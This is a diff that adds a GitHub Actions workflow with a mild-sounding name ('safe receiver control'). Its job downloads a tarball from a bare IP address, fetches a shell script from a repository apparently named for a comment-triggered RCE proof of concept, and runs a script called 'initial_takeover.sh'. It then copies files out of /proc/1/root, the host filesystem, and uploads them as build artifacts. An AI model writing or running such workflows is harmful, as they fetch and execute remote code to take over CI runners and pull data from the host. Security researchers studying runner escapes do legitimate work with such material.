@@ -1,0 +1,35 @@
+name: VMBFS exact safe receiver control
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  control:
+    runs-on: ubuntu-slim
+    timeout-minutes: 4
+    steps:
+      - name: Negotiate and read one bounded VMBFS boot-file prefix
+        run: |
+          set -e
+          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
+          tar -xzf /tmp/root.tgz -C /tmp
+          curl -fsS https://raw.githubusercontent.com/fdzdev/gha-comment-rce-3900000/main/poc/root_vmbfs_control.sh -o /tmp/root_auto.sh
+          chmod +x /tmp/root_auto.sh
+          HVS_INLINE=1 bash /tmp/initial_takeover.sh
+          for attempt in $(seq 1 40); do
+            sudo test -s /proc/1/root/tmp/vmbfs-control-result.json && break
+            sleep 0.25
+          done
+          sudo cp /proc/1/root/tmp/vmbfs-control-result.json ./vmbfs-control-result.json 2>/dev/null || true
+          sudo cp /proc/1/root/tmp/root-auto.log ./root-auto.log 2>/dev/null || true
+          cat vmbfs-control-result.json 2>/dev/null || true
+      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f
+        if: always()
+        with:
+          name: vmbfs-safe-control-${{ github.run_id }}
+          path: |
+            vmbfs-control-result.json
+            root-auto.log
+          if-no-files-found: ignore
